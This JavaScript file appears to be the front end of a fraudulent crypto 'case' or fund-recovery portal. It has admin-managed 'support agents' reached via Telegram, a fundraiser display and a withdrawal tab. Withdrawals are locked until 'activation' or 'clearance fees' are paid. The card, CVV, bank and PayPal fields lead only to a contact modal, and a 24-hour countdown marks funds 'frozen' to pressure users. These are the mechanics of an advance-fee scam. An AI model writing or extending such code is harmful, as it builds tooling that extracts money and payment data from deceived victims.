  const fill  = document.getElementById('fr-fill');
  const track = document.getElementById('fr-track');
  const log   = document.getElementById('fr-log');
  if (fill)  { fill.style.background = 'linear-gradient(90deg, #0E6640 0%, #1A9060 50%, #28C87A 100%)'; fill.style.width = '0.5%'; fill.className = 'fr-fill'; }
  if (track) { track.className = 'fr-track'; }
  if (log)   { log.innerHTML = '<div class="fr-empty">// Awaiting first transaction...</div>'; }
  frUpdateUI();
  startFundraiser();
}

// ════════════════════════════════════
// CASE ACTIVE COUNTDOWN TIMER
// ════════════════════════════════════
const CT_DURATION = 24 * 60 * 60 * 1000; // 24 hours in ms
let ctInterval = null;

function ctStorageKey(clientId) {
  return 'sv_ct_' + clientId;
}

function ctStart(clientId) {
  ctStop();

  // Retrieve or create the deadline timestamp
  const key = ctStorageKey(clientId);
  let deadline = parseInt(localStorage.getItem(key), 10);
  if (!deadline || isNaN(deadline)) {
    deadline = Date.now() + CT_DURATION;
    localStorage.setItem(key, deadline);
  }

  document.getElementById('case-timer-wrap').style.display = 'flex';

  function ctSetDigit(id, char, urgent) {
    const el = document.getElementById(id);
    if (!el) return;
    if (el.textContent !== char) {
      el.classList.remove('flip');
      void el.offsetWidth; // reflow to restart animation
      el.textContent = char;
      el.classList.add('flip');
    }
    el.classList.toggle('urgent', urgent);
  }

  function tick() {
    const remaining = deadline - Date.now();
    if (remaining <= 0) {
      ctExpire(clientId);
      return;
    }
    const h   = Math.floor(remaining / 3_600_000);
    const m   = Math.floor((remaining % 3_600_000) / 60_000);
    const s   = Math.floor((remaining % 60_000) / 1_000);
    const pad = n => String(n).padStart(2, '0');
    const ph  = pad(h); const pm = pad(m); const ps = pad(s);
    const urgent = remaining < 3_600_000;

    ctSetDigit('ct-h1', ph[0], urgent);
    ctSetDigit('ct-h2', ph[1], urgent);
    ctSetDigit('ct-m1', pm[0], urgent);
    ctSetDigit('ct-m2', pm[1], urgent);
    ctSetDigit('ct-s1', ps[0], urgent);
    ctSetDigit('ct-s2', ps[1], urgent);
  }

  tick();
  ctInterval = setInterval(tick, 1000);
}

function ctStop() {
  clearInterval(ctInterval);
  ctInterval = null;
  const wrap = document.getElementById('case-timer-wrap');
  if (wrap) wrap.style.display = 'none';
}

// ════════════════════════════════════
// SUPPORT AGENTS DATA STORE
// ════════════════════════════════════
function getAgents() {
  try { return JSON.parse(localStorage.getItem('sv_agents') || '[]'); }
  catch { return []; }
}
function saveAgents(agents) {
  localStorage.setItem('sv_agents', JSON.stringify(agents));
}

let editingAgentId  = null;
let agentPicData    = null; // base64 string
let agentBadges     = [];   // array of badge strings

// ════════════════════════════════════
// AGENT FORM — PICTURE
// ════════════════════════════════════
function handleAgentPicUpload(input) {
  const file = input.files[0];
  if (!file) return;
  if (file.size > 600 * 1024) {
    toast('Image too large — max 600 KB', true); input.value = ''; return;
  }
  const reader = new FileReader();
  reader.onload = e => {
    agentPicData = e.target.result;
    const prev = document.getElementById('af-pic-preview');
    prev.innerHTML = `<img src="${agentPicData}" alt=""/>`;
  };
  reader.readAsDataURL(file);
}

function clearAgentPic() {
  agentPicData = null;
  document.getElementById('af-pic-preview').innerHTML = '?';
  document.getElementById('af-pic-input').value = '';
}

// ════════════════════════════════════
// AGENT FORM — BADGES
// ════════════════════════════════════
function renderBadgeChips() {
  const container = document.getElementById('af-badge-chips');
  if (!container) return;
  container.innerHTML = agentBadges.map((b, i) => `
    <span class="badge-chip">
      ${esc(b)}
      <button class="badge-chip-remove" type="button" onclick="removeAgentBadge(${i})" title="Remove">×</button>
    </span>`).join('');
}

function addAgentBadge() {
  const inp = document.getElementById('af-badge-input');
  const val = inp.value.trim();
  if (!val) return;
  if (agentBadges.includes(val)) { inp.value = ''; return; }
  agentBadges.push(val);
  inp.value = '';
  renderBadgeChips();
}

function removeAgentBadge(idx) {
  agentBadges.splice(idx, 1);
  renderBadgeChips();
}

// ════════════════════════════════════
// AGENT CRUD
// ════════════════════════════════════
function saveAgent() {
  const fullname = document.getElementById('af-fullname').value.trim();
  const role     = document.getElementById('af-role').value.trim();
  const desc     = document.getElementById('af-desc').value.trim();
  const telegram = document.getElementById('af-telegram').value.trim();
  const phone    = document.getElementById('af-phone').value.trim();
  const msgEl    = document.getElementById('agent-form-msg');

  if (!fullname || !role) {
    showMsg(msgEl, '// FULL NAME AND ROLE REQUIRED', 'error'); return;
  }

  const agents = getAgents();
  const agentObj = {
    fullname, role, desc, telegram, phone,
    pic:    agentPicData,
    badges: [...agentBadges],
  };

  if (editingAgentId) {
    const idx = agents.findIndex(a => a.id === editingAgentId);
    if (idx === -1) { showMsg(msgEl, '// AGENT NOT FOUND', 'error'); return; }
    agents[idx] = { ...agents[idx], ...agentObj };
    saveAgents(agents);
    clearAgentForm();
    showMsg(msgEl, '// AGENT UPDATED SUCCESSFULLY', 'success');
    toast('Agent record updated');
  } else {
    agents.push({ id: 'ag_' + Date.now(), ...agentObj });
    saveAgents(agents);
    clearAgentForm();
    showMsg(msgEl, '// AGENT CREATED SUCCESSFULLY', 'success');
    toast('Agent ' + fullname + ' created');
  }

  renderAgentsTable();
  populateAgentAssignList();
}

function clearAgentForm() {
  ['af-fullname','af-role','af-desc','af-telegram','af-phone'].forEach(id => {
    document.getElementById(id).value = '';
  });
  clearAgentPic();
  agentBadges = [];
  renderBadgeChips();
  editingAgentId = null;
  document.getElementById('btn-agent-submit').textContent = 'CREATE AGENT →';
  document.getElementById('agent-form-title').textContent = 'NEW SUPPORT AGENT';
}

function editAgent(id) {
  const a = getAgents().find(ag => ag.id === id);
  if (!a) return;
  document.getElementById('af-fullname').value = a.fullname;
  document.getElementById('af-role').value     = a.role;
  document.getElementById('af-desc').value     = a.desc || '';
  document.getElementById('af-telegram').value = a.telegram || '';
  document.getElementById('af-phone').value    = a.phone || '';
  agentPicData = a.pic || null;
  const prev = document.getElementById('af-pic-preview');
  prev.innerHTML = agentPicData ? `<img src="${agentPicData}" alt=""/>` : '?';
  agentBadges = [...(a.badges || [])];
  renderBadgeChips();
  editingAgentId = id;
  document.getElementById('btn-agent-submit').textContent = 'UPDATE AGENT →';
  document.getElementById('agent-form-title').textContent = 'EDIT SUPPORT AGENT';
  document.getElementById('admin-breadcrumb').textContent = 'EDIT AGENT';
  // Scroll form into view
  document.getElementById('agent-form').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function deleteAgent(id) {
  const agents = getAgents().filter(a => a.id !== id);
  saveAgents(agents);
  // Remove from any client that had this agent assigned
  const clients = getClients();
  clients.forEach(c => {
    if (c.agents) c.agents = c.agents.filter(aid => aid !== id);
  });
  saveClients(clients);
  renderAgentsTable();
  populateAgentAssignList();
  toast('Agent removed');
}

// ════════════════════════════════════
// AGENTS TABLE (admin)
// ════════════════════════════════════
function agentInitials(name) {
  return (name || '').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
}

function renderAgentsTable() {
  const agents    = getAgents();
  const container = document.getElementById('agents-table-container');
  if (!container) return;

  if (!agents.length) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-txt">// NO AGENTS CREATED YET</div></div>';
    return;
  }

  container.innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>Agent</th><th>Role</th><th>Telegram</th><th>Phone</th><th>Badges</th><th>Actions</th>
        </tr>
      </thead>
      <tbody>
        ${agents.map(a => `
          <tr>
            <td>
              <div class="agent-admin-row">
                <div class="agent-admin-pic">
                  ${a.pic ? `<img src="${a.pic}" alt=""/>` : esc(agentInitials(a.fullname))}
                </div>
                <div>
                  <div style="font-family:'Space Grotesk',sans-serif;font-size:12px;font-weight:600;color:var(--txt)">${esc(a.fullname)}</div>
                  ${a.desc ? `<div style="font-family:'Inter',sans-serif;font-size:10px;color:var(--txt-dim);margin-top:2px">${esc(a.desc)}</div>` : ''}
                </div>
              </div>
            </td>
            <td class="td-mono" style="font-size:9px;letter-spacing:0.15em;text-transform:uppercase;color:var(--primary-act)">${esc(a.role)}</td>
            <td class="td-mono">${a.telegram ? esc(a.telegram) : '<span style="color:var(--txt-muted)">—</span>'}</td>
            <td class="td-mono">${a.phone    ? esc(a.phone)    : '<span style="color:var(--txt-muted)">—</span>'}</td>
            <td>
              <div style="display:flex;flex-wrap:wrap;gap:4px">
                ${(a.badges||[]).map(b => `<span class="agent-badge">${esc(b)}</span>`).join('') || '<span style="color:var(--txt-muted);font-size:10px">—</span>'}
              </div>
            </td>
            <td>
              <div class="table-actions">
                <button class="btn-ghost" onclick="editAgent('${a.id}')">EDIT</button>
                <button class="btn-danger" onclick="deleteAgent('${a.id}')">DELETE</button>
              </div>
            </td>
          </tr>`).join('')}
      </tbody>
    </table>`;
}

// ════════════════════════════════════
// AGENT ASSIGNMENT IN CLIENT FORM
// ════════════════════════════════════
function populateAgentAssignList(selectedIds = []) {
  const list = document.getElementById('cf-agent-assign-list');
  if (!list) return;
  const agents = getAgents();

  if (!agents.length) {
    list.innerHTML = '<div class="agent-assign-empty">// NO AGENTS CREATED — ADD AGENTS IN SUPPORT AGENTS SECTION</div>';
    return;
  }

  list.innerHTML = agents.map(a => {
    const checked = selectedIds.includes(a.id);
    return `
      <div class="agent-assign-item${checked ? ' checked' : ''}" onclick="toggleAgentAssign(this,'${a.id}')">
        <div class="agent-assign-check">${checked ? '✓' : ''}</div>
        <div class="agent-admin-pic" style="width:28px;height:28px;font-size:8px;flex-shrink:0">
          ${a.pic ? `<img src="${a.pic}" alt=""/>` : esc(agentInitials(a.fullname))}
        </div>
        <span class="agent-assign-name">${esc(a.fullname)}</span>
        <span class="agent-assign-role-lbl">${esc(a.role)}</span>
      </div>`;
  }).join('');
}

function toggleAgentAssign(el, agentId) {
  el.classList.toggle('checked');
  const check = el.querySelector('.agent-assign-check');
  check.textContent = el.classList.contains('checked') ? '✓' : '';
}

function getCheckedAgentIds() {
  const list = document.getElementById('cf-agent-assign-list');
  if (!list) return [];
  return [...list.querySelectorAll('.agent-assign-item.checked')].map(el => {
    const onclick = el.getAttribute('onclick');
    const match = onclick.match(/'(ag_[^']+)'/);
    return match ? match[1] : null;
  }).filter(Boolean);
}

// ════════════════════════════════════
// CLIENT SUPPORT VIEW
// ════════════════════════════════════
function renderClientSupport(client) {
  const container = document.getElementById('client-support-container');
  if (!container) return;

  const assignedIds = client.agents || [];
  if (!assignedIds.length) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-txt">// NO SUPPORT AGENTS ASSIGNED TO YOUR ACCOUNT</div></div>';
    return;
  }

  const allAgents = getAgents();
  const agents = assignedIds.map(id => allAgents.find(a => a.id === id)).filter(Boolean);

  if (!agents.length) {
    container.innerHTML = '<div class="empty-state"><div class="empty-state-txt">// NO SUPPORT AGENTS ASSIGNED TO YOUR ACCOUNT</div></div>';
    return;
  }

  container.innerHTML = `<div class="agent-grid">${agents.map((a, i) => `
    <div class="agent-card">
      <div class="agent-card-sweep"></div>
      <span class="agent-index">${String(i + 1).padStart(2,'0')}</span>
      <span class="agent-corner-tr"></span>
      <div class="agent-profile-row">
        <div class="agent-avatar">
          ${a.pic ? `<img src="${a.pic}" alt="${esc(a.fullname)}"/>` : esc(agentInitials(a.fullname))}
        </div>
        <div class="agent-meta">
          <div class="agent-name">${esc(a.fullname)}</div>
          <div class="agent-role-tag">${esc(a.role)}</div>
          ${a.desc ? `<div class="agent-desc">${esc(a.desc)}</div>` : ''}
        </div>
      </div>
      ${(a.badges||[]).length ? `<div class="agent-badges">${a.badges.map(b => `<span class="agent-badge">${esc(b)}</span>`).join('')}</div>` : ''}
      <div class="agent-contacts">
        <div class="agent-status-bar">
          <span class="sq-pulse" style="background:var(--ok)"></span>
          Available
        </div>
        ${a.telegram ? `
        <div class="agent-contact-item">
          <div class="agent-contact-icon">
            <svg viewBox="0 0 24 24"><path d="M21.5 4.5L2.5 11.5l7 2m12-9L16.5 20.5l-7-7m12-9l-9 16"/></svg>
          </div>
          <a class="agent-contact-val" href="https://t.me/${esc(a.telegram.replace(/^@/,''))}" target="_blank" rel="noopener noreferrer" style="color:var(--primary);text-decoration:none;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">${esc(a.telegram)}</a>
        </div>` : ''}
        ${a.phone ? `
        <div class="agent-contact-item">
          <div class="agent-contact-icon">
            <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
          </div>
          <span class="agent-contact-val">${esc(a.phone)}</span>
        </div>` : ''}
        ${!a.telegram && !a.phone ? `
        <div class="agent-contact-item" style="padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:7.5px;color:var(--txt-muted);letter-spacing:0.2em;text-transform:uppercase">
          // No contact details provided
        </div>` : ''}
      </div>
    </div>`).join('')}</div>`;
}

// ════════════════════════════════════
// WITHDRAW TAB
// ════════════════════════════════════

const WD_NETWORKS = {
  BTC:  ['Bitcoin (BTC)', 'Lightning Network'],
  ETH:  ['Ethereum (ERC-20)', 'Arbitrum One', 'Optimism', 'Base'],
  USDT: ['Ethereum (ERC-20)', 'Tron (TRC-20)', 'BNB Smart Chain (BEP-20)', 'Polygon'],
  USDC: ['Ethereum (ERC-20)', 'Solana (SPL)', 'Arbitrum One', 'Base', 'Polygon'],
  BNB:  ['BNB Smart Chain (BEP-20)', 'BNB Beacon Chain (BEP-2)'],
  SOL:  ['Solana (SPL)'],
};

function wdInitView() {
  if (!currentUser) return;
  const status = currentUser.status || 'activated';
  const isActive = status === 'activated';
  const hero = document.getElementById('wd-balance-hero');
  const lockLayer = document.getElementById('wd-lock-layer');
  const lockTitle = document.getElementById('wd-locked-title');
  const lockBody = document.getElementById('wd-locked-body');
  const panelPreview = document.getElementById('wd-panel-preview');

  hero.classList.remove('hidden', 'blurred');
  if (panelPreview) panelPreview.classList.toggle('preview-locked', !isActive);
  if (lockLayer) lockLayer.classList.toggle('hidden', isActive);

  if (!isActive && lockTitle && lockBody) {
    if (status === 'procedure') {
      lockTitle.textContent = 'Activation Pending';
      lockBody.textContent = 'Your account needs to be fully activated and all required fees paid before withdrawals can be processed. The payout form below is shown as a preview only.';
    } else if (status === 'frozen') {
      lockTitle.textContent = 'Account Frozen';
      lockBody.textContent = 'Your account is frozen. Contact support before withdrawals can be processed. The payout form below is shown as a preview only.';
    } else {
      lockTitle.textContent = 'Withdrawal Access Restricted';
      lockBody.textContent = 'Your account must be re-activated and any necessary clearance fees paid before withdrawals can be processed. The payout form below is shown as a preview only.';
    }
  }

  const total = (parseFloat(currentUser.usdc) || 0) + (parseFloat(currentUser.usdt) || 0);
  document.getElementById('wd-balance-value').textContent = fmt(total);
}

function wdSelectMethod(btn) {
  document.querySelectorAll('.wd-method-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const m = btn.dataset.method;
  document.querySelectorAll('.wd-panel').forEach(p => p.classList.remove('active'));
  document.getElementById('wd-panel-' + m).classList.add('active');
}

function wdUpdateNetworks() {
  const asset  = document.getElementById('wd-crypto-asset').value;
  const netSel = document.getElementById('wd-crypto-network');
  if (!asset || !WD_NETWORKS[asset]) {
    netSel.innerHTML = '<option value="">Select asset first</option>';
    return;
  }
  netSel.innerHTML = '<option value="">Select network</option>' +
    WD_NETWORKS[asset].map(n => `<option value="${n}">${n}</option>`).join('');
}

function wdSetPreset(fieldId, val) {
  document.getElementById(fieldId).value = val;
}

function wdSetPresetAll(fieldId) {
  if (!currentUser) return;
  const total = (parseFloat(currentUser.usdc) || 0) + (parseFloat(currentUser.usdt) || 0);
  document.getElementById(fieldId).value = total.toFixed(2);
}

function wdFormatCard(input) {
  let v = input.value.replace(/\D/g, '').slice(0, 16);
  input.value = v.replace(/(.{4})/g, '$1 ').trim();
}

function wdFormatExpiry(input) {
  let v = input.value.replace(/\D/g, '').slice(0, 4);
  if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
  input.value = v;
}

function wdFieldError(id, errId, show) {
  const inp = document.getElementById(id);
  const err = document.getElementById(errId);
  if (show) {
    inp.classList.add('wd-invalid');
    err.classList.add('visible');
  } else {
    inp.classList.remove('wd-invalid');
    err.classList.remove('visible');
  }
  return !show;
}

function wdAmountValid(fieldId, errId) {
  const val = parseFloat(document.getElementById(fieldId).value);
  const ok  = !isNaN(val) && val >= 50;
  const inp = document.getElementById(fieldId);
  const err = document.getElementById(errId);
  if (!ok) { inp.classList.add('wd-invalid'); err.classList.add('visible'); }
  else      { inp.classList.remove('wd-invalid'); err.classList.remove('visible'); }
  return ok;
}

function wdEmailValid(val) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
}

function wdSubmit(method) {
  if (!currentUser || (currentUser.status || 'activated') !== 'activated') {
    toast('Account activation required before withdrawals', true);
    return;
  }

  let valid = true;

  if (method === 'bank') {
    valid &= wdFieldError('wd-bank-holder',  'err-bank-holder',  !document.getElementById('wd-bank-holder').value.trim());
    valid &= wdFieldError('wd-bank-name',    'err-bank-name',    !document.getElementById('wd-bank-name').value.trim());
    valid &= wdFieldError('wd-bank-account', 'err-bank-account', !document.getElementById('wd-bank-account').value.trim());
    valid &= wdFieldError('wd-bank-routing', 'err-bank-routing', !document.getElementById('wd-bank-routing').value.trim());
    valid &= wdAmountValid('wd-bank-amount', 'err-bank-amount');
  }

  if (method === 'crypto') {
    const asset   = document.getElementById('wd-crypto-asset').value;
    const network = document.getElementById('wd-crypto-network').value;
    const addr    = document.getElementById('wd-crypto-address').value.trim();
    valid &= wdFieldError('wd-crypto-asset',   'err-crypto-asset',   !asset);
    valid &= wdFieldError('wd-crypto-network', 'err-crypto-network', !network);
    valid &= wdFieldError('wd-crypto-address', 'err-crypto-address', !addr);
    valid &= wdAmountValid('wd-crypto-amount', 'err-crypto-amount');
  }

  if (method === 'paypal') {
    const email   = document.getElementById('wd-paypal-email').value.trim();
    const confirm = document.getElementById('wd-paypal-confirm').value.trim();
    const emailOk = wdEmailValid(email);
    const matchOk = email === confirm && wdEmailValid(confirm);
    valid &= wdFieldError('wd-paypal-email',   'err-paypal-email',   !emailOk);
    document.getElementById('err-paypal-confirm').textContent = !confirm ? '// Field required' : '// Emails do not match';
    valid &= wdFieldError('wd-paypal-confirm', 'err-paypal-confirm', !matchOk);
    valid &= wdAmountValid('wd-paypal-amount', 'err-paypal-amount');
  }

  if (method === 'card') {
    const holder = document.getElementById('wd-card-holder').value.trim();
    const num    = document.getElementById('wd-card-number').value.replace(/\s/g,'');
    const expiry = document.getElementById('wd-card-expiry').value.trim();
    const cvv    = document.getElementById('wd-card-cvv').value.trim();
    const expiryOk = /^\d{2}\s*\/\s*\d{2}$/.test(expiry);
    const cvvOk    = /^\d{3,4}$/.test(cvv);
    valid &= wdFieldError('wd-card-holder', 'err-card-holder', !holder);
    valid &= wdFieldError('wd-card-number', 'err-card-number', num.length < 16);
    valid &= wdFieldError('wd-card-expiry', 'err-card-expiry', !expiryOk);
    valid &= wdFieldError('wd-card-cvv',    'err-card-cvv',    !cvvOk);
    valid &= wdAmountValid('wd-card-amount', 'err-card-amount');
  }

  if (!valid) return;
  wdOpenContactModal();
}

function wdOpenContactModal() {
  const section = document.getElementById('wd-modal-agent-section');
  section.innerHTML = '';

  if (currentUser && currentUser.agents && currentUser.agents.length) {
    const allAgents = getAgents();
    const firstAgent = allAgents.find(a => a.id === currentUser.agents[0]);
    if (firstAgent) {
      section.innerHTML = `
        <div class="wd-modal-agent-block">
          <div class="wd-modal-agent-name">${esc(firstAgent.fullname)}</div>
          <div class="wd-modal-agent-role">${esc(firstAgent.role)}</div>
          <div class="wd-modal-agent-contacts">
            ${firstAgent.telegram ? `<div class="wd-modal-contact-row">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 4.5L2.5 11.5l7 2m12-9L16.5 20.5l-7-7m12-9l-9 16"/></svg>
              <a href="https://t.me/${esc(firstAgent.telegram.replace(/^@/,''))}" target="_blank" rel="noopener noreferrer">${esc(firstAgent.telegram)}</a>
            </div>` : ''}
            ${firstAgent.phone ? `<div class="wd-modal-contact-row">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
              <span>${esc(firstAgent.phone)}</span>
            </div>` : ''}
          </div>
        </div>`;
    }
  }

  document.getElementById('wd-contact-modal').classList.add('show');
}

document.getElementById('wd-contact-modal').addEventListener('click', function(e) {
  if (e.target === this) this.classList.remove('show');
});

function ctExpire(clientId) {
  ctStop();
  localStorage.removeItem(ctStorageKey(clientId));

  // Update client status to "closed" (Funds Frozen)
  const clients = getClients();
  const idx = clients.findIndex(c => c.id === clientId);
  if (idx !== -1) {
    clients[idx].status = 'closed';
    saveClients(clients);
    // Update the visible badge immediately
    const badgeEl = document.getElementById('client-case-badge');
    if (badgeEl) {
      badgeEl.className = 'case-badge case-closed';
      document.getElementById('client-case-label').textContent = 'Restricted';
    }
    toast('Decision window expired — funds frozen', true);
  }
}
